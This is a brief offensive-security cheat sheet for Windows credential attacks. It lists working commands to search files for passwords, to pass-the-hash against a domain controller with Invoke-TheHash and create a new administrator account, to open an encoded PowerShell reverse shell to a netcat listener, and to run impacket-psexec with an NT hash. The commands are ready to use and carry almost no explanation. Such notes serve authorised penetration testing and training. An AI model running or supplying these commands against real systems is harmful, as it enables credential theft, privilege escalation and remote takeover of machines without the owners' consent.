# Password extraction - powershell

## Powershell - "password" kw in files based on extensions
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Powershell - PTH with Invoke-TheHash (uses WMI & SMB)
```
Import-Module .\Invoke-TheHash.psd1
# Create a new user, add it to the Administrators group
Invoke-SMBExec -Target <DC IP> -Domain <DOMAIN> -Username <VICTIM USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net <NEW USER> <NEW PASSWD> /add && net localgroup administrators <NEW USER> /add" -Verbose

# Addition : revshell

# setup netcat listener
.\nc.exe -lvnp <PORT>

# Launch revshell
Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <REVSHELL IN B64>"
```

## psexec - PTH
```
impacket-psexec administrator@10.129.201.126 -hashes :<NT HASH> # LM hash is left blank
```
